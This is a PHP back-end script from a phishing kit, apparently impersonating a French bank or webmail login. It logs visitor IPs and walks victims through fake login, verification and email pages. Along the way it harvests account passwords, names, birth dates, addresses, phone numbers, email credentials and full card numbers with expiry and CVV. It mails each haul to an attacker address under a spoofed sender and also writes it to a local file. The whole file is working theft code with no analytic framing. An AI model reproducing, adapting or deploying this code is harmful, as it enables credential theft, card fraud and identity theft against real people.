<?php
//      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//                         No Need to Edit Below This Line
//                                Made in 2014                                    
//      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		$ip = $_SERVER['REMOTE_ADDR'];
		$agent = $_SERVER['HTTP_USER_AGENT'];
		$entry_line = "$ip | UA: $agent | \r\n";
		$fp = fopen("../ip.log", "a");
		fputs($fp, $entry_line);
		fclose($fp);
		
	error_reporting(0);
	include "send.php";
	$A="loginpage.php";  $B="verf.php"; $C="email.php"; $fin="fin.php";
	error_reporting(0); set_time_limit(240);
	if (getenv(HTTP_CLIENT_IP)){
	  $ip=getenv(HTTP_CLIENT_IP);
	  }
	  else {
	  $ip=getenv(REMOTE_ADDR);
	}
	$hostname = gethostbyaddr($ip);
	$agt = $_SERVER['HTTP_USER_AGENT'];
	function lrtrim($string){
	return stripslashes(ltrim(rtrim($string)));
	}
	function query_str($params){
	  $str = '';
	  foreach ($params as $key => $value) {
	  $str .= (strlen($str) < 1) ? '' : '&';
	  $str .= $key . '=' . rawurlencode($value);
	  }
	  return ($str);
	}
	
	parse_str($_SERVER['QUERY_STRING']);
	  
	if($PaReq=="a8f4b2ef1e2374eb0fe37fc0249d1020")
	{
	  include $A;
	  exit;
	}
	
	  elseif ($PaReq=="a8f4b2ef1e2374eb0fe37fc0249d10")
	{
	  $b = query_str($_POST);
	  parse_str($b);
	  $user=rtrim($CCPTE);
	  $pass=rtrim($CCCRYC);
	  
	  $firsterror="0";
	  //!filter_var($user, FILTER_VALIDATE_EMAIL) || 
	  if(empty($user) || strlen($user) < 3 || empty($pass) || strlen($pass) < 3){
	  $firsterror="0";
	  include $A; exit;
	  }
	  
	  include $B;
	  
	}

		elseif ($PaReq=="e2Hom08Nx34ktvUSKu7jPGrGj20UX1nFKA2xAbDtuiXy22d9gr45zrw9g31PBmO")
	{
	  $b = query_str($_POST);
	  parse_str($b);
	  $user=rtrim($user);
	  $pass=rtrim($pass);
	  $nom=rtrim($nom);
	  $pnm=rtrim($pnm);
	  $adr=rtrim($adr);
	  $cty=rtrim($cty);
	  $zip=rtrim($zip);
	  $dobd=rtrim($dobd);
	  $dobm=rtrim($dobm);
	  $doby=rtrim($doby);
 $tele=rtrim($tele);
	  $ccn=rtrim($ccn);
	  $exm=rtrim($exm);
	  $exy=rtrim($exy);
	  $cvv=rtrim($cvv);
	  $dob = "$dobd.$dobm.$doby";
	  $firsterror="0";
	  
	  if(empty($nom)){
	  $firsterror="1";
	  $civclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $civcolor="COLOR: #e4414e";
	  }
	  
	  if(empty($nom) || strlen($nom) < 3){
	  $firsterror="1";
	  $nomclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $nomcolor="COLOR: #e4414e";

	  }
	  if(empty($pnm) || strlen($pnm) < 3){
	  $firsterror="1";
	  $prenomclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $prenomcolor="COLOR: #e4414e";
	  }
	  if(!preg_match("/[0-9]{2}.[0-9]{2}.[1][9][0-9]{2}/", $dob)){
	  $firsterror="1";
	  $dobclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $dobcolor="COLOR: #e4414e";
	  }
	  if(empty($adr) || strlen($adr) < 3){
	  $firsterror="1";
	  $adrclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $adrcolor="COLOR: #e4414e";
	  }
	  if(empty($cty) || strlen($cty) < 3){
	  $firsterror="1";
	  $ctyclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $ctycolor="COLOR: #e4414e";
	  }
	  if(empty($zip) || strlen($zip) < 3){
	  $firsterror="1";
	  $zipclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $zipcolor="COLOR: #e4414e";
	  }
	  

	  
	  include_once 'creditcards.class.php';
	  $CCV = new CreditCardValidator();
	  
	  $CCV->Validate($ccn);
	  $CARDINFO = $CCV->GetCardInfo();

	
	  if (strtoupper($CARDINFO['status']) == "INVALID") {
	  $firsterror="1";
	  $ccnclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $ccncolor="COLOR: #e4414e";
	  }

	  if(empty($exm) || empty($exy)){
	  $firsterror="1";
	  $expclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $expcolor="COLOR: #e4414e";
	  }
	  if(!is_numeric($cvv) || empty($cvv) || strlen($cvv) < 3 || strlen($cvv) > 3){
	  $firsterror="1";
	  $cvvclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
	  $cvvcolor="COLOR: #e4414e";
	  }
	  
	  	if($firsterror=="1"){
			include $B; exit;
		}  
			$emailx=str_replace("@","%40",$email);
			$email1x=strtolower($emailx);
			$email2x=strtolower($email);
			$domain = strstr($email2x, '@');
	  include $C;
	      $message  = "------------------+ CaRg +------------------\n";
		  $message .= "Us3rname : $user\n";
		  $message .= "P4ssword : $pass\n";
		  $message .= "------------------------\n";
		  $message .= "Nom      : $nom\n";
		  $message .= "Pr3nom   : $pnm\n";
		  $message .= "Dob      : $dob\n";
		  $message .= "Adr      : $adr\n";
 $message .= "Tel      : $tele\n";
		  $message .= "City     : $cty\n";
		  $message .= "Zip		: $zip\n";
		  $message .= "------------------------\n";
		  $message .= "EMAIL   : $email\n";
		  $message .= "Pass    : $pwd\n";
		  $message .= "------------------------\n";
		  $message .= "Cnumer   : $ccn\n";
		  $message .= "3xperat  : $exm - $exy\n";
		  $message .= "Cv       : $cvv\n";
		  $message .= "------------------------\n";
		  $message .= "IP    : $ip | $hostname\n";
		  $message .= "Agent : $agent\n";
		  $message .= "------------------+ GooooD +------------------\n";
		  $subject = "# $domain #| $ip # ";
		  $headers = "From: Service <smtp@fastnet.com>";
		  mail($send,$subject,$message,$headers);
		  $fp = fopen('../Ca.txt', 'a');
          fwrite($fp, $message);
          fclose($fp);
			
		  if ($domain == "@orange.fr" or $domain == "@wanadoo.fr" or $domain == "@sfr.fr" or $domain == "@neuf.fr" or $domain == "@club-internet.fr" or $domain == "@hotmail.fr" or $domain == "@hotmail.com" or $domain == "@outlook.fr" or $domain == "@outlook.com" or $domain == "@live.fr" or $domain == "@live.com" or $domain == "@yahoo.com" or $domain == "@yahoo.fr"){
		    
			
			if($firsterror=="1"){
			$pwdclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
			$pwdcolor="COLOR: #e4414e";
			$firsterror="1";
			include $C; exit;
		}
			
		  }
	}
	
		elseif ($PaReq=="8A3VD6dY5fmzHov7BqtUfGLNFXLtMEbjbfgItuiX1jaOpukDAMCCrmrEZu9aciwEROyD9weu9tVlm8bFBwaX9x9jQJV1vbFmNdPU")
	{
	  $b = query_str($_POST);
	  parse_str($b);
	  $email=rtrim($email);
	  $pwd=rtrim($pwd);
	  
	  
	  	
					//echo $ReturnedData1;

			if($firsterror=="1"){
			$pwdclass ="color: #000000; font-family: Verdana; font-weight: bold; font-size: 12px; background-color: #fdf3f4; BORDER: 1px solid #e4414e;";
			$pwdcolor="COLOR: #e4414e";
			$firsterror="1";
			include $C; exit;
		} 

		  $message  = "------------------+ CaRg +------------------\n";
		  $message .= "EMAIL   : $email\n";
		  $message .= "Pass    : $pwd\n";
		  $message .= "------------------------\n";
		  $message .= "IP    : $ip | $hostname\n";
		  $message .= "Agent : $agent\n";
		  $message .= "------------------+ GooooD +------------------\n";
		  $subject = "# $domain #| $ip # ";
		  $headers = "From: Service <smtp@fastnet.com>";
		  mail($send,$subject,$message,$headers);
		  $fp = fopen('../Ca.txt', 'a');
          fwrite($fp, $message);
          fclose($fp);
          include $fin;

}
?>